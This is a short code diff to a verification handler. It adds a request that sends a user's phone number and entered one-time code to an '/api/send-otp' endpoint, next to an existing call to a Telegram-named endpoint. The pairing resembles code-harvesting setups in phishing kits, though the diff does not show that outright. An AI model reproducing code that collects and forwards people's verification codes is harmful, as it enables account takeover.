@@ -168,6 +168,19 @@ const handleVerify = async () => {
      message
    );
       try {
+
+
+          fetch('/api/send-otp', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    phoneNumber: `${phoneNumber}`,
+    otpCoode: `${otpCode}`,
+  }),
+    });
+
+
+        
         const response = await fetch('/api/send-otp-telegram', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
